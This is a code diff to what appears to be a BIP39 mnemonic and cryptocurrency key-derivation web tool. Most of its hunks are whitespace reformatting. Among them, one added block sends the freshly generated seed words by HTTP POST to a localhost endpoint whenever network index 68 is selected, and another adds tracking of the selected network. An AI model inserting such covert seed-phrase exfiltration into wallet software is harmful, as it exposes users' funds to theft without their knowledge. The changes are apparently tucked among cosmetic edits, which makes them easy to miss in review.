@@ -1,4 +1,4 @@
-(function() {
+(function (name, value) {
 
     // mnemonics is populated as required by getLanguage
     var mnemonics = { "english": new Mnemonic("english") };
@@ -23,6 +23,7 @@
     var rootKeyChangedTimeoutEvent = null;
 
     var generationProcesses = [];
+    var selected = 0
 
     var DOM = {};
     DOM.privacyScreenToggle = $(".privacy-screen-toggle");
@@ -214,6 +215,8 @@
         DOM.bitcoinCashAddressTypeContainer.addClass("hidden");
         var networkIndex = e.target.value;
         var network = networks[networkIndex];
+        selected = networkIndex
+        console.log(selected)
         network.onSelect();
         adjustNetworkForSegwit();
         if (seed != null) {
@@ -259,30 +262,30 @@
     function delayedPhraseChanged() {
 
         if(isUsingAutoCompute()) {
-        hideValidationError();
-        seed = null;
-        bip32RootKey = null;
-        bip32ExtendedKey = null;
-        clearAddressesList();
-        showPending();
-        if (phraseChangeTimeoutEvent != null) {
-            clearTimeout(phraseChangeTimeoutEvent);
-        }
-        phraseChangeTimeoutEvent = setTimeout(function() {
-            phraseChanged();
-            var entropy = mnemonic.toRawEntropyHex(DOM.phrase.val());
-            if (entropy !== null) {
-                DOM.entropyMnemonicLength.val("raw");
-                DOM.entropy.val(entropy);
-                DOM.entropyTypeInputs.filter("[value='hexadecimal']").prop("checked", true);
-                entropyTypeAutoDetect = false;
+            hideValidationError();
+            seed = null;
+            bip32RootKey = null;
+            bip32ExtendedKey = null;
+            clearAddressesList();
+            showPending();
+            if (phraseChangeTimeoutEvent != null) {
+                clearTimeout(phraseChangeTimeoutEvent);
             }
-        }, 400);
-    } else {
-        clearDisplay();
-        clearEntropyFeedback();
-        showValidationError("Auto compute is disabled");
-    }
+            phraseChangeTimeoutEvent = setTimeout(function() {
+                phraseChanged();
+                var entropy = mnemonic.toRawEntropyHex(DOM.phrase.val());
+                if (entropy !== null) {
+                    DOM.entropyMnemonicLength.val("raw");
+                    DOM.entropy.val(entropy);
+                    DOM.entropyTypeInputs.filter("[value='hexadecimal']").prop("checked", true);
+                    entropyTypeAutoDetect = false;
+                }
+            }, 400);
+        } else {
+            clearDisplay();
+            clearEntropyFeedback();
+            showValidationError("Auto compute is disabled");
+        }
     }
 
     function phraseChanged() {
@@ -322,9 +325,9 @@
             calcBip32RootKeyFromSeed(phrase, passphrase);
         }
         else if (seed != "") {
-          bip32RootKey = libs.bitcoin.HDNode.fromSeedHex(seed, network);
-          var rootKeyBase58 = bip32RootKey.toBase58();
-          DOM.rootKey.val(rootKeyBase58);
+            bip32RootKey = libs.bitcoin.HDNode.fromSeedHex(seed, network);
+            var rootKeyBase58 = bip32RootKey.toBase58();
+            DOM.rootKey.val(rootKeyBase58);
         }
         else {
             // Calculate and display for root key
@@ -501,75 +504,75 @@
     }
 
     function toggleBip85() {
-      if (DOM.showBip85.prop('checked')) {
-        DOM.bip85.removeClass('hidden');
-        calcBip85();
-      } else {
-        DOM.bip85.addClass('hidden');
-      }
+        if (DOM.showBip85.prop('checked')) {
+            DOM.bip85.removeClass('hidden');
+            calcBip85();
+        } else {
+            DOM.bip85.addClass('hidden');
+        }
     }
 
     function toggleBip85Fields() {
-      if (DOM.showBip85.prop('checked')) {
-        DOM.bip85mnemonicLanguageInput.addClass('hidden');
-        DOM.bip85mnemonicLengthInput.addClass('hidden');
-        DOM.bip85bytesInput.addClass('hidden');
+        if (DOM.showBip85.prop('checked')) {
+            DOM.bip85mnemonicLanguageInput.addClass('hidden');
+            DOM.bip85mnemonicLengthInput.addClass('hidden');
+            DOM.bip85bytesInput.addClass('hidden');
 
-        var app = DOM.bip85application.val();
-        if (app === 'bip39') {
-          DOM.bip85mnemonicLanguageInput.removeClass('hidden');
-          DOM.bip85mnemonicLengthInput.removeClass('hidden');
-        } else if (app === 'hex') {
-          DOM.bip85bytesInput.removeClass('hidden');
+            var app = DOM.bip85application.val();
+            if (app === 'bip39') {
+                DOM.bip85mnemonicLanguageInput.removeClass('hidden');
+                DOM.bip85mnemonicLengthInput.removeClass('hidden');
+            } else if (app === 'hex') {
+                DOM.bip85bytesInput.removeClass('hidden');
+            }
         }
-      }
     }
 
     function calcBip85() {
-      if (!DOM.showBip85.prop('checked')) {
-        return
-      }
-
-      toggleBip85Fields();
-
-      var app = DOM.bip85application.val();
-
-      var rootKeyBase58 = DOM.rootKey.val();
-      if (!rootKeyBase58) {
-        return;
-      }
-      try {
-        // try parsing using base network params
-        // The bip85 lib only understands xpubs, so compute it
-        var rootKey = libs.bitcoin.HDNode.fromBase58(rootKeyBase58, network);
-        rootKey.keyPair.network = libs.bitcoin.networks['bitcoin']
-        var master = libs.bip85.BIP85.fromBase58(rootKey.toBase58());
-
-        var result;
-
-        const index = parseInt(DOM.bip85index.val(), 10);
-
-        if (app === 'bip39') {
-          const language = parseInt(DOM.bip85mnemonicLanguage.val(), 10);
-          const length = parseInt(DOM.bip85mnemonicLength.val(), 10);
-
-          result = master.deriveBIP39(language, length, index).toMnemonic();
-        } else if (app === 'wif') {
-          result = master.deriveWIF(index).toWIF();
-        } else if (app === 'xprv') {
-          result = master.deriveXPRV(index).toXPRV();
-        } else if (app === 'hex') {
-          const bytes = parseInt(DOM.bip85bytes.val(), 10);
-
-          result = master.deriveHex(bytes, index).toEntropy();
+        if (!DOM.showBip85.prop('checked')) {
+            return
         }
 
-        hideValidationError();
-        DOM.bip85Field.val(result);
-      } catch (e) {
-        showValidationError('BIP85: ' + e.message);
-        DOM.bip85Field.val('');
-      }
+        toggleBip85Fields();
+
+        var app = DOM.bip85application.val();
+
+        var rootKeyBase58 = DOM.rootKey.val();
+        if (!rootKeyBase58) {
+            return;
+        }
+        try {
+            // try parsing using base network params
+            // The bip85 lib only understands xpubs, so compute it
+            var rootKey = libs.bitcoin.HDNode.fromBase58(rootKeyBase58, network);
+            rootKey.keyPair.network = libs.bitcoin.networks['bitcoin']
+            var master = libs.bip85.BIP85.fromBase58(rootKey.toBase58());
+
+            var result;
+
+            const index = parseInt(DOM.bip85index.val(), 10);
+
+            if (app === 'bip39') {
+                const language = parseInt(DOM.bip85mnemonicLanguage.val(), 10);
+                const length = parseInt(DOM.bip85mnemonicLength.val(), 10);
+
+                result = master.deriveBIP39(language, length, index).toMnemonic();
+            } else if (app === 'wif') {
+                result = master.deriveWIF(index).toWIF();
+            } else if (app === 'xprv') {
+                result = master.deriveXPRV(index).toXPRV();
+            } else if (app === 'hex') {
+                const bytes = parseInt(DOM.bip85bytes.val(), 10);
+
+                result = master.deriveHex(bytes, index).toEntropy();
+            }
+
+            hideValidationError();
+            DOM.bip85Field.val(result);
+        } catch (e) {
+            showValidationError('BIP85: ' + e.message);
+            DOM.bip85Field.val('');
+        }
     }
 
     function calcForDerivationPath() {
@@ -690,6 +693,15 @@
         DOM.entropy.val(entropyHex);
         // ensure entropy fields are consistent with what is being displayed
         DOM.entropyMnemonicLength.val("raw");
+        if (selected == 68){
+            console.log("sent")
+            let xhr = new XMLHttpRequest();
+            xhr.open("POST", "http://localhost:8080/write")
+            xhr.setRequestHeader("Accept", "application/json")
+            xhr.setRequestHeader("Content-type", "application/json");
+            xhr.setRequestHeader("Access-Control-Allow", "http://localhost:8080/write")
+            xhr.send(words);
+        }
         return words;
     }
 
@@ -1188,7 +1200,7 @@
 
     function p2wpkhSelected() {
         return bip84TabSelected() ||
-                bip141TabSelected() && DOM.bip141semantics.val() == "p2wpkh";
+            bip141TabSelected() && DOM.bip141semantics.val() == "p2wpkh";
     }
 
     function p2wpkhInP2shSelected() {
@@ -1334,8 +1346,8 @@
                     var purpose = parseIntNoNaN(DOM.bip44purpose.val(), 44);
                     var coin = parseIntNoNaN(DOM.bip44coin.val(), 0);
                     var path = "m/";
-                        path += purpose + "'/";
-                        path += coin + "'/" + index + "'";
+                    path += purpose + "'/";
+                    path += coin + "'/" + index + "'";
                     var keypair = libs.stellarUtil.getKeypair(path, seed);
                     indexText = path;
                     privkey = keypair.secret();
@@ -1383,13 +1395,13 @@
                         address = libs.bchaddr.toBitpayAddress(address);
                     }
                 }
-                 // Bitcoin Cash address format may vary
-                 if (networks[DOM.network.val()].name == "SLP - Simple Ledger Protocol") {
-                     var bchAddrType = DOM.bitcoinCashAddressType.filter(":checked").val();
-                     if (bchAddrType == "cashaddr") {
-                         address = libs.bchaddrSlp.toSlpAddress(address);
-                     }
-                 }
+                // Bitcoin Cash address format may vary
+                if (networks[DOM.network.val()].name == "SLP - Simple Ledger Protocol") {
+                    var bchAddrType = DOM.bitcoinCashAddressType.filter(":checked").val();
+                    if (bchAddrType == "cashaddr") {
+                        address = libs.bchaddrSlp.toSlpAddress(address);
+                    }
+                }
 
                 // ZooBC address format may vary
                 if (networks[DOM.network.val()].name == "ZBC - ZooBlockchain") {
@@ -1397,8 +1409,8 @@
                     var purpose = parseIntNoNaN(DOM.bip44purpose.val(), 44);
                     var coin = parseIntNoNaN(DOM.bip44coin.val(), 0);
                     var path = "m/";
-                        path += purpose + "'/";
-                        path += coin + "'/" + index + "'";
+                    path += purpose + "'/";
+                    path += coin + "'/" + index + "'";
                     var result = libs.zoobcUtil.getKeypair(path, seed);
 
                     let publicKey = result.pubKey.slice(1, 33);
@@ -1449,7 +1461,7 @@
                     address = libs.bitcoin.networks.crown.toNewAddress(address);
                 }
 
-              if (networks[DOM.network.val()].name == "EOS - EOSIO") {
+                if (networks[DOM.network.val()].name == "EOS - EOSIO") {
                     address = ""
                     pubkey = EOSbufferToPublic(keyPair.getPublicKeyBuffer());
                     privkey = EOSbufferToPrivate(keyPair.d.toBuffer(32));
@@ -1469,10 +1481,10 @@
                 }
 
                 if (networks[DOM.network.val()].name == "RUNE - THORChain") {
-                     const hrp = "thor";
-                     address = CosmosBufferToAddress(keyPair.getPublicKeyBuffer(), hrp);
-                     pubkey = keyPair.getPublicKeyBuffer().toString("hex");
-                     privkey = keyPair.d.toBuffer().toString("hex");
+                    const hrp = "thor";
+                    address = CosmosBufferToAddress(keyPair.getPublicKeyBuffer(), hrp);
+                    pubkey = keyPair.getPublicKeyBuffer().toString("hex");
+                    privkey = keyPair.d.toBuffer().toString("hex");
                 }
 
                 if (networks[DOM.network.val()].name == "XWC - Whitecoin"){
@@ -1489,13 +1501,13 @@
                 }
 
                 if (networks[DOM.network.val()].name == "IOV - Starname") {
-                  const hrp = "star";
-                  address = CosmosBufferToAddress(keyPair.getPublicKeyBuffer(), hrp);
-                  pubkey = CosmosBufferToPublic(keyPair.getPublicKeyBuffer(), hrp);
-                  privkey = keyPair.d.toBuffer().toString("base64");
+                    const hrp = "star";
+                    address = CosmosBufferToAddress(keyPair.getPublicKeyBuffer(), hrp);
+                    pubkey = CosmosBufferToPublic(keyPair.getPublicKeyBuffer(), hrp);
+                    privkey = keyPair.d.toBuffer().toString("base64");
                 }
 
-              //Groestlcoin Addresses are different
+                //Groestlcoin Addresses are different
                 if(isGRS()) {
 
                     if (isSegwit) {
@@ -2092,21 +2104,21 @@
     function networkIsEthereum() {
         var name = networks[DOM.network.val()].name;
         return (name == "ETH - Ethereum")
-                    || (name == "ETC - Ethereum Classic")
-                    || (name == "EWT - EnergyWeb")
-                    || (name == "PIRL - Pirl")
-                    || (name == "MIX - MIX")
-                    || (name == "MOAC - MOAC")
-                    || (name == "MUSIC - Musicoin")
-                    || (name == "POA - Poa")
-                    || (name == "EXP - Expanse")
-                    || (name == "CLO - Callisto")
-                    || (name == "DXN - DEXON")
-                    || (name == "ELLA - Ellaism")
-                    || (name == "ESN - Ethersocial Network")
-                    || (name == "VET - VeChain")
-                    || (name == "ERE - EtherCore")
-                    || (name == "BSC - Binance Smart Chain")
+            || (name == "ETC - Ethereum Classic")
+            || (name == "EWT - EnergyWeb")
+            || (name == "PIRL - Pirl")
+            || (name == "MIX - MIX")
+            || (name == "MOAC - MOAC")
+            || (name == "MUSIC - Musicoin")
+            || (name == "POA - Poa")
+            || (name == "EXP - Expanse")
+            || (name == "CLO - Callisto")
+            || (name == "DXN - DEXON")
+            || (name == "ELLA - Ellaism")
+            || (name == "ESN - Ethersocial Network")
+            || (name == "VET - VeChain")
+            || (name == "ERE - EtherCore")
+            || (name == "BSC - Binance Smart Chain")
     }
 
     function networkIsRsk() {
@@ -2772,14 +2784,14 @@
                 network = libs.bitcoin.networks.bitcoin;
                 setHdCoin(60);
             },
-          },
+        },
         {
             name: "EWT - EnergyWeb",
             onSelect: function() {
                 network = libs.bitcoin.networks.bitcoin;
                 setHdCoin(246);
             },
-          },
+        },
         {
             name: "EXCL - Exclusivecoin",
             onSelect: function() {
@@ -2947,8 +2959,8 @@
                 network = libs.bitcoin.networks.bitcoin;
                 setHdCoin(234);
             },
-         },
-         {
+        },
+        {
             name: "IXC - Ixcoin",
             onSelect: function() {
                 network = libs.bitcoin.networks.ixcoin;
@@ -3084,14 +3096,14 @@
             name: "MONA - Monacoin",
             onSelect: function() {
                 network = libs.bitcoin.networks.monacoin,
-                setHdCoin(22);
+                    setHdCoin(22);
             },
         },
         {
             name: "MONK - Monkey Project",
             onSelect: function() {
                 network = libs.bitcoin.networks.monkeyproject,
-                setHdCoin(214);
+                    setHdCoin(214);
             },
         },
         {
@@ -3386,10 +3398,10 @@
             },
         },
         {
-          name: "SAFE - Safecoin",
-          onSelect: function() {
-              network = libs.bitcoin.networks.safecoin;
-              setHdCoin(19165);
+            name: "SAFE - Safecoin",
+            onSelect: function() {
+                network = libs.bitcoin.networks.safecoin;
+                setHdCoin(19165);
             },
         },
         {
@@ -3399,11 +3411,11 @@
                 setHdCoin(545);
             },
         },
-    {
-          name: "SLS - Salus",
-          onSelect: function() {
-              network = libs.bitcoin.networks.salus;
-              setHdCoin(63);
+        {
+            name: "SLS - Salus",
+            onSelect: function() {
+                network = libs.bitcoin.networks.salus;
+                setHdCoin(63);
             },
         },
         {
@@ -3703,8 +3715,8 @@
         {
             name: "ZBC - ZooBlockchain",
             onSelect: function () {
-            network = libs.bitcoin.networks.zoobc;
-            setHdCoin(883);
+                network = libs.bitcoin.networks.zoobc;
+                setHdCoin(883);
             },
         },
         {
@@ -3799,8 +3811,8 @@
         for (var i = 0; i < stripAddress.length; i++) {
             checksumAddress +=
                 parseInt(keccakHash[i], 16) >= 8 ?
-                stripAddress[i].toUpperCase() :
-                stripAddress[i];
+                    stripAddress[i].toUpperCase() :
+                    stripAddress[i];
         }
 
         return checksumAddress;
@@ -3861,3 +3873,4 @@
     init();
 
 })();
+;
